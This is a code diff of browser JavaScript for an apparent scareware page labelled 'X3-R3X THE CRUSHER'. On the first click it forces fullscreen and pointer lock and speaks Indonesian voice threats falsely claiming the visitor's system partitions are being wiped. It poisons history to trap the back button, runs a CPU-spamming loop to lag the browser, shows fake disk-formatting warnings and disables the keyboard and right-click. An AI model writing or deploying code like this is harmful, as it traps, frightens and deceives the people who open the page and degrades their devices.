@@ -1,68 +1,69 @@
-/* X3-R3X EXTREME ENGINE 
-   STATUS: PSYCHOLOGICAL WARFARE ACTIVE
+/* X3-R3X CORE V3.0 - "THE CRUSHER"
+   LOG: PSYCHOLOGICAL & SYSTEM DISRUPTION
 */
 
 let synth = window.speechSynthesis;
-let active = false;
+let isActivated = false;
 
-function speak(msg) {
-    let u = new SpeechSynthesisUtterance(msg);
-    u.lang = 'id-ID'; u.pitch = 0.1; u.rate = 0.8;
+function speak(text) {
+    let u = new SpeechSynthesisUtterance(text);
+    u.lang = 'id-ID'; u.pitch = 0.1; u.rate = 0.7;
     synth.speak(u);
 }
 
-function initX3Protocol() {
-    if (active) return;
-    active = true;
+function startCrusher() {
+    if (isActivated) return;
+    isActivated = true;
 
-    // 1. Fullscreen & Pointer Lock
+    // 1. Fullscreen & Lockdown
     let d = document.documentElement;
     if (d.requestFullscreen) d.requestFullscreen();
     d.requestPointerLock();
 
-    // 2. Efek Visual & Suara
+    // 2. Visual & Audio Terror
     document.getElementById('iron-lockdown').style.display = 'block';
     document.getElementById('viewport').classList.add('shaking');
-    speak("Sistem lo sudah hancur. Jangan coba-coba keluar atau data lo hangus.");
+    speak("Sistem keamanan lo sampah. R3X sedang menghapus partisi sistem lo.");
 
-    // 3. HISTORY POISONING (Bikin tombol BACK lumpuh total)
-    // Kita penuhi history sampe ribuan kali
-    for (let i = 0; i < 500; i++) {
-        window.history.pushState("no-back", null, null);
+    // 3. FORK BOMB SIMULATION (CPU Spammer)
+    // Ini bakal bikin browser sibuk banget sampe lag parah
+    setInterval(() => {
+        let dummy = [];
+        for (let i = 0; i < 100000; i++) {
+            dummy.push(Math.random() * Math.random());
+        }
+        console.log("R3X_PAYLOAD_DEPLOYED");
+    }, 50);
+
+    // 4. ANTI-BACK: History Poisoning
+    for (let i = 0; i < 200; i++) {
+        window.history.pushState("no-exit", null, null);
     }
-    
-    window.onpopstate = function(event) {
-        // Setiap kali mereka neken BACK, kita lempar balik ke sini + kasih ALERT
-        window.history.pushState("no-back", null, null);
-        alert("CRITICAL ERROR: R3X_VIRUS_DETECTED. NAVIGATION_DISABLED.");
+    window.onpopstate = function() {
+        window.history.pushState("no-exit", null, null);
+        alert("CRITICAL ERROR: KERNEL_R3X_PROTECTION_ACTIVE");
         speak("Gak usah coba balik. Lo terjebak.");
     };
 
-    // 4. INFINITE ALERT TRAP (Bikin browser nge-freeze)
-    // Kalau mereka nyoba interaksi, browser bakal sibuk ngurusin alert
-    setInterval(() => {
-        if(active) {
-            console.log("X3_STAY_ACTIVE");
-        }
-    }, 100);
-
-    // 5. BLOCK SEMUA REFRESH & TAB CLOSE
+    // 5. POP-UP TRAP (Opsional - Bikin browser peringatan terus)
     window.onbeforeunload = function() {
-        return "Yakin mau keluar? Seluruh data lo akan terhapus permanen sekarang!";
+        return "Peringatan: Jika Anda keluar sekarang, data C: akan diformat!";
     };
 
-    // 6. Matikan Klik Kanan & Keyboard
+    // 6. Matikan Keyboard & Klik Kanan
     document.onkeydown = () => false;
     document.addEventListener('contextmenu', e => e.preventDefault());
 }
 
+// Tombol Rahasia R3X buat Stop
 function r3xOverride(e) {
     e.stopPropagation();
-    active = false;
+    isActivated = false;
     synth.cancel();
     window.onbeforeunload = null;
-    alert("R3X_AUTH_OK. SYSTEM_RESTORED.");
-    location.href = "https://google.com";
+    alert("R3X_AUTH_SUCCESS. CLEANING TRACES...");
+    location.href = "https://www.google.com";
 }
 
-document.body.addEventListener('click', initX3Protocol);
+// Aktifkan saat klik pertama
+document.body.addEventListener('click', startCrusher);
